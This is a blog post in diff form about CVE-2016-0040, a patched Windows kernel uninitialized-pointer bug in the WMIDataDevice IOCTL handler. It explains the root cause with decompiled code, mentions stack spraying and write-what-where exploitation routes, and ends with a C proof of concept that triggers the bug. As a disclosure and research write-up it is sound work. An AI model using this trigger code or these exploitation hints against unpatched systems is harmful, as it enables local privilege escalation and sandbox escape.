@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>CVE-2016-0040 Story of Uninitialized Pointer in Windows Kernel | My interesting researches</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="CVE-2016-0040 Story of Uninitialized Pointer in Windows Kernel" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="This post is a resharing of a blog I wrote about a vulnerability I discovered in Windows kernel almost a decade ago." />
+<meta property="og:description" content="This post is a resharing of a blog I wrote about a vulnerability I discovered in Windows kernel almost a decade ago." />
+<link rel="canonical" href="http://localhost:4000/fuzzing/2024/03/27/wmicuninitializedpointer.html" />
+<meta property="og:url" content="http://localhost:4000/fuzzing/2024/03/27/wmicuninitializedpointer.html" />
+<meta property="og:site_name" content="My interesting researches" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-03-27T22:27:59+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="CVE-2016-0040 Story of Uninitialized Pointer in Windows Kernel" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-03-27T22:27:59+01:00","datePublished":"2024-03-27T22:27:59+01:00","description":"This post is a resharing of a blog I wrote about a vulnerability I discovered in Windows kernel almost a decade ago.","headline":"CVE-2016-0040 Story of Uninitialized Pointer in Windows Kernel","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/fuzzing/2024/03/27/wmicuninitializedpointer.html"},"url":"http://localhost:4000/fuzzing/2024/03/27/wmicuninitializedpointer.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="My interesting researches" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">My interesting researches</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">CVE-2016-0040 Story of Uninitialized Pointer in Windows Kernel</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2024-03-27T22:27:59+01:00" itemprop="datePublished">Mar 27, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>This post is a resharing of a blog I wrote about a vulnerability I discovered in Windows kernel almost a decade ago.</p>
+
+<p>this vulnerablity is interesting for two reseaons first it gave Write arbitrary data to arbitrary address, second it has an amusing story associated with it. after my discovery of this vulnerability, I shared a tweet about it, which caught the attention of researchers from Microsoft. Remarkably, they were able to discern the root cause of the vulnerability simply by examining my tweet.
+you can read their story in <a href="https://msrc.microsoft.com/blog/2017/06/tales-from-the-msrc-from-pixels-to-poc/">MSRC blog</a></p>
+
+<p><img src="/assets/tweet.png" alt="My image Name" /></p>
+
+<p>A few months ago, I discovered some vulnerabilities in the Windows kernel, mostly related to local privilege escalation. Microsoft patched one of the reported vulnerabilities in MS16-014. The vulnerability type is an uninitialized pointer dereference. This vulnerability can be triggered even by a process with “low integrity level”, meaning that successfully exploiting this vulnerability can lead to bypassing the sandbox (for example, the IE sandbox) or generic local privilege escalation for any process.</p>
+
+<p>Here’s a description of the bug:</p>
+
+<p>For handling some WMI functions, Windows NT creates a named device called “WMIDataDevice”. This device is accessible from user mode with any permission (you can check it with WinObj). WMIDataDevice handles some IOCTLs, with the WmipReceiveNotifications function responsible for the IOCTL_WMI_ENUMERATE_GUIDS IOCTL. Based on the first DWORD of Irp-&gt;AssociatedIrp.SystemBuffer, WmipReceiveNotifications decides whether to use the stack or kernel pool as a buffer for storing data/pointers. If the first DWORD is less than or equal to 0x10, the stack is selected as the buffer.</p>
+
+<p>There’s another important usage of the mentioned DWORD. WmipReceiveNotifications uses this DWORD as a counter for looping and initializing the local buffer. So, if we put 0 in the first DWORD of Irp-&gt;AssociatedIrp.SystemBuffer from user mode, the function selects the stack as the buffer. As mentioned earlier, this buffer is initiated in a loop. In this case, since we passed 0, the function skips loop execution, leaving the stack buffer uninitialized.</p>
+
+<p>To reach the vulnerability, we need to bypass some other condition inside WmipReceiveNotifications.</p>
+
+<p>v16 comes from user mode and its value needs to be 2.</p>
+
+<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="n">v16</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">SystemBuffer</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span></code></pre></figure>
+
+<p>Insert a valid handle for ObReferenceObjectByHandle in SystemBuffer.</p>
+
+<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="n">v39</span> <span class="o">=</span> <span class="n">ObReferenceObjectByHandle</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">HANDLE</span> <span class="o">*</span><span class="p">)(</span><span class="n">SystemBuffer</span> <span class="o">+</span> <span class="mi">16</span><span class="p">),</span> <span class="mh">0x43Au</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">PIRP</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span></code></pre></figure>
+
+<p>finally uninitialized local variable used as target pointer and function write a DWORD from SystemBuffer + 8 to it</p>
+
+<p>we can control what is written but for manipulating uninitialized stack we need a good stack spray inside kernel</p>
+
+<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="n">v23</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">LocalBuffer</span><span class="p">;</span>
+
+<span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v23</span> <span class="o">+</span> <span class="mi">60</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">SystemBuffer</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span> <span class="c1">// Write arbitrary data to uninitialized local variable or Write-what-where condition</span></code></pre></figure>
+
+<p>Utilizing an uninitialized local variable as a pointer to write arbitrary data to its referenced location requires the attacker to employ a stack spraying technique for successful exploitation. This vulnerability presents a “write-what-where” condition, offering multiple ways for exploitation, such as zero ACL or SET token permission.</p>
+
+<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="kt">int</span> <span class="n">__userpurge</span> <span class="n">WmipReceiveNotifications</span> <span class="err">@</span><span class="p">(</span><span class="kt">int</span> <span class="n">SystemBuffer</span> <span class="err">@</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span> <span class="n">OutputBufferSize</span><span class="p">,</span> <span class="n">PVOID</span> <span class="n">PIRP</span><span class="p">)</span> <span class="p">{</span>
+     <span class="p">...</span>
+     <span class="p">...</span>
+ 
+     <span class="n">v4</span> <span class="o">=</span> <span class="n">SystemBuffer</span><span class="p">;</span>
+     <span class="n">v5</span> <span class="o">=</span> <span class="o">*</span> <span class="n">OutputBufferSize</span><span class="p">;</span>
+     <span class="n">v6</span> <span class="o">=</span> <span class="o">*</span> <span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span> <span class="p">)</span> <span class="n">v4</span><span class="p">;</span>
+     <span class="n">v39</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1073741811</span><span class="p">;</span>
+     <span class="n">v37</span> <span class="o">=</span> <span class="n">v5</span><span class="p">;</span>
+     <span class="n">v36</span> <span class="o">=</span> <span class="n">v6</span><span class="p">;</span>
+     <span class="k">if</span> <span class="p">(</span><span class="n">v6</span> <span class="o">&lt;=</span> <span class="mh">0x10</span><span class="p">)</span> <span class="c1">// if first value inside buffer from user mode is less than or equal to 0x10 then use local stack so we pass 0 to force use local stack</span>
+     <span class="p">{</span>
+         <span class="n">LocalBuffer</span> <span class="o">=&amp;</span> <span class="n">v32</span><span class="p">;;</span>
+         
+     <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+         <span class="n">LocalBuffer</span> <span class="o">=</span> <span class="n">ExAllocatePoolWithTag</span><span class="p">(</span><span class="n">PagedPool</span><span class="p">,</span> <span class="mi">8</span> <span class="o">*</span> <span class="n">v6</span><span class="p">,</span> <span class="mh">0x70696D57</span> <span class="n">u</span><span class="p">);</span>
+         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">LocalBuffer</span><span class="p">)</span>
+             <span class="k">return</span> <span class="o">-</span><span class="mi">1073741670</span><span class="p">;</span>
+     <span class="p">}</span>
+ 
+     <span class="n">we</span> <span class="n">don</span> <span class="err">'</span><span class="n">t</span> <span class="n">go</span> <span class="n">inside</span> <span class="k">this</span> <span class="k">if</span> <span class="n">because</span> <span class="n">we</span> <span class="n">use</span> <span class="n">passed</span> <span class="n">zero</span>
+ 
+     <span class="n">v42</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+     <span class="n">v40</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+     <span class="n">v38</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+     <span class="n">v44</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+     <span class="n">v41</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+     <span class="k">if</span> <span class="p">(</span><span class="n">v6</span><span class="p">)</span> 
+<span class="p">{</span>
+         <span class="k">do</span> <span class="p">{</span>
+             <span class="n">v39</span> <span class="o">=</span> <span class="n">ObReferenceObjectByHandle</span><span class="p">(</span> <span class="o">*</span> <span class="p">(</span><span class="n">HANDLE</span> <span class="o">*</span> <span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">*</span> <span class="n">v41</span> <span class="o">+</span> <span class="mi">24</span><span class="p">),</span> <span class="mi">4</span> <span class="n">u</span><span class="p">,</span> <span class="n">WmipGuidObjectType</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span><span class="o">&amp;</span><span class="n">Object</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+             <span class="k">if</span> <span class="p">(</span><span class="n">v39</span><span class="o">&lt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">goto</span> <span class="n">LABEL_55</span><span class="p">;</span>
+             <span class="n">v8</span> <span class="o">=</span> <span class="n">Object</span><span class="p">;</span>
+             <span class="n">v9</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+             <span class="k">if</span> <span class="p">(</span><span class="n">v44</span><span class="p">)</span> <span class="p">{</span>
+                 <span class="k">while</span> <span class="p">(</span><span class="n">Object</span> <span class="o">!=</span> <span class="o">*</span> <span class="p">((</span><span class="n">PVOID</span> <span class="o">*</span> <span class="p">)</span> <span class="n">LocalBuffer</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">v9</span><span class="p">))</span> <span class="p">{.......</span>
+                 <span class="p">}</span>
+             <span class="p">}</span>
+         <span class="p">}</span>
+     <span class="p">}</span> <span class="c1">// because v42 and v45 is set to 0 we also bypass this two if </span>
+<span class="k">if</span> <span class="p">(</span> <span class="n">v42</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span> <span class="p">{</span> <span class="p">...</span> <span class="p">...</span> <span class="p">...</span> <span class="p">}</span> 
+<span class="k">if</span> <span class="p">(</span> <span class="n">v45</span> <span class="o">|</span> <span class="n">BYTE3</span><span class="p">(</span><span class="n">PIRP</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="n">v13</span> <span class="o">=</span> <span class="n">v37</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span> <span class="n">v11</span> <span class="o">&amp;</span><span class="n">v37</span> <span class="p">)</span>
+     
+  <span class="o">*</span> <span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span> <span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">48</span><span class="p">)</span> <span class="o">=</span> <span class="n">v11</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span> <span class="p">)</span> <span class="n">v4</span> <span class="o">=</span> <span class="mi">56</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span> <span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">44</span><span class="p">)</span> <span class="o">=</span> <span class="mi">32</span><span class="p">;</span> <span class="o">*</span> <span class="n">OutputBufferSize</span> <span class="o">=</span> <span class="mi">56</span><span class="p">;</span>
+     
+     <span class="p">...</span>
+     <span class="p">...</span>
+     <span class="p">...</span>
+ 
+ <span class="c1">//v16 come from user mode so we can set it's value 2 then lead code to here</span>
+ 
+ <span class="k">if</span> <span class="p">(</span><span class="n">v16</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> 
+<span class="p">{</span>
+     <span class="nl">LABEL_54:</span>
+         <span class="o">*</span> <span class="n">OutputBufferSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+     <span class="k">goto</span> <span class="n">LABEL_55</span><span class="p">;</span>
+ <span class="p">}</span>
+ <span class="n">v39</span> <span class="o">=</span> <span class="n">ObReferenceObjectByHandle</span><span class="p">(</span> <span class="o">*</span> <span class="p">(</span><span class="n">HANDLE</span> <span class="o">*</span> <span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">16</span><span class="p">),</span> <span class="mh">0x43A</span> <span class="n">u</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span><span class="o">&amp;</span><span class="n">PIRP</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+ <span class="k">if</span> <span class="p">(</span><span class="n">v39</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span>
+ <span class="p">{</span>
+     <span class="n">v39</span> <span class="o">=</span> <span class="n">ObOpenObjectByPointerWithTag</span><span class="p">((</span><span class="n">ULONG_PTR</span><span class="p">)</span> <span class="n">PIRP</span><span class="p">,</span> <span class="mi">512</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x1FFFFF</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1953261124</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v35</span><span class="p">);</span>
+     <span class="k">if</span> <span class="p">(</span><span class="n">v39</span><span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span>
+ <span class="p">{</span>
+         <span class="n">v23</span> <span class="o">=</span> <span class="o">*</span> <span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span> <span class="p">)</span> <span class="n">LocalBuffer</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span> <span class="p">)(</span><span class="n">v23</span> <span class="o">+</span> <span class="mi">60</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span> <span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span> <span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span> <span class="c1">// write arbitrary data from uninitialized local variable</span></code></pre></figure>
+
+<h1 id="advantages-of-the-vulnerability">Advantages of the vulnerability:</h1>
+<ul>
+  <li>The bug can be triggered even in low integrity contexts.</li>
+  <li>It’s unrelated to win32k.sys, meaning it ignores the “Win32k system call disable policy”, for instance in Chrome browser.</li>
+  <li>It works with the default OS configuration, providing a universal sandbox bypass.</li>
+</ul>
+
+<p>sample poc for the vulnerability</p>
+
+<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="k">typedef</span> <span class="k">union</span> <span class="p">{</span>
+    <span class="n">HANDLE</span> <span class="n">Handle</span><span class="p">;</span>
+    <span class="n">ULONG64</span> <span class="n">Handle64</span><span class="p">;</span>
+    <span class="n">ULONG32</span> <span class="n">Handle32</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="n">HANDLE3264</span><span class="p">,</span> <span class="o">*</span> <span class="n">PHANDLE3264</span><span class="p">;</span>
+ 
+<span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+    <span class="c1">//</span>
+    <span class="c1">// List of guid notification handles</span>
+    <span class="c1">//</span>
+    <span class="n">ULONG</span> <span class="n">HandleCount</span><span class="p">;</span>
+    <span class="n">ULONG</span> <span class="n">Action</span><span class="p">;</span>
+    <span class="n">HANDLE</span> <span class="cm">/* PUSER_THREAD_START_ROUTINE */</span> <span class="n">UserModeCallback</span><span class="p">;</span>
+    <span class="n">HANDLE3264</span> <span class="n">UserModeProcess</span><span class="p">;</span>
+    <span class="n">HANDLE3264</span> <span class="n">Handles</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
+<span class="p">}</span>
+<span class="n">WMIRECEIVENOTIFICATION</span><span class="p">,</span> <span class="o">*</span> <span class="n">PWMIRECEIVENOTIFICATION</span><span class="p">;</span>
+ 
+<span class="cp">#
+</span><span class="n">define</span> <span class="n">RECEIVE_ACTION_CREATE_THREAD</span> <span class="mi">2</span> <span class="c1">// Mark guid objects as requiring</span>
+ 
+<span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+    <span class="n">IN</span> <span class="n">VOID</span> <span class="o">*</span> <span class="n">ObjectAttributes</span><span class="p">;</span>
+    <span class="n">IN</span> <span class="n">ACCESS_MASK</span> <span class="n">DesiredAccess</span><span class="p">;</span>
+ 
+    <span class="n">OUT</span> <span class="n">HANDLE3264</span> <span class="n">Handle</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="n">WMIOPENGUIDBLOCK</span><span class="p">,</span> <span class="o">*</span> <span class="n">PWMIOPENGUIDBLOCK</span><span class="p">;</span>
+ 
+<span class="cp">#
+</span><span class="n">define</span> <span class="n">IOCTL_WMI_ENUMERATE_GUIDS</span>\
+<span class="n">CTL_CODE</span><span class="p">(</span><span class="n">FILE_DEVICE_UNKNOWN</span><span class="p">,</span> <span class="n">WmiEnumerateGuidList</span><span class="p">,</span> <span class="n">METHOD_BUFFERED</span><span class="p">,</span> <span class="n">FILE_READ_ACCESS</span><span class="p">)</span>
+ 
+<span class="kt">void</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">DWORD</span> <span class="n">dwBytesReturned</span><span class="p">;</span>
+    <span class="n">HANDLE</span> <span class="n">threadhandle</span><span class="p">;</span>
+    <span class="n">WMIRECEIVENOTIFICATION</span> <span class="n">buffer</span><span class="p">;</span>
+    <span class="n">CHAR</span> <span class="n">OutPut</span><span class="p">[</span><span class="mi">1000</span><span class="p">];</span>
+ 
+    <span class="n">memset</span><span class="p">(</span> <span class="o">&amp;</span> <span class="n">amp</span><span class="p">;</span> <span class="n">buffer</span><span class="p">,</span> <span class="sc">'\x41'</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span> <span class="c1">// set ecx to 0x41414141</span>
+    <span class="n">buffer</span><span class="p">.</span><span class="n">HandleCount</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">buffer</span><span class="p">.</span><span class="n">Action</span> <span class="o">=</span> <span class="n">RECEIVE_ACTION_CREATE_THREAD</span><span class="p">;</span>
+    <span class="n">buffer</span><span class="p">.</span><span class="n">UserModeProcess</span><span class="p">.</span><span class="n">Handle</span> <span class="o">=</span> <span class="n">GetCurrentProcess</span><span class="p">();</span> 
+ 
+    <span class="c1">// using NtMapUserPhysicalPages for spraying stack cant help us</span>
+ 
+    <span class="n">HANDLE</span> <span class="n">hDriver</span> <span class="o">=</span> <span class="n">CreateFileA</span><span class="p">(</span><span class="s">"</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">WMIDataDevice"</span><span class="p">,</span> <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">hDriver</span> <span class="o">!=</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">while</span> <span class="p">(</span><span class="n">TRUE</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDriver</span><span class="p">,</span> <span class="n">IOCTL_WMI_RECEIVE_NOTIFICATIONS</span><span class="p">,</span> <span class="o">&amp;</span> <span class="n">amp</span><span class="p">;</span> <span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span> <span class="o">&amp;</span> <span class="n">amp</span><span class="p">;</span> <span class="n">OutPut</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">OutPut</span><span class="p">),</span> <span class="o">&amp;</span> <span class="n">amp</span><span class="p">;</span> <span class="n">dwBytesReturned</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span> <span class="p">{</span>
+                <span class="k">return</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+ 
+    <span class="p">}</span>
+ 
+<span class="p">}</span></code></pre></figure>
+
+
+  </div><a class="u-url" href="/fuzzing/2024/03/27/wmicuninitializedpointer.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">My interesting researches</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">My interesting researches</li><li><a class="u-email" href="mailto:mml@example.com">mml@example.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/R00tkitSMM"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">R00tkitSMM</span></a></li><li><a href="https://www.twitter.com/R00tkitSMM"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">R00tkitSMM</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>I share what I find interesting here..</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
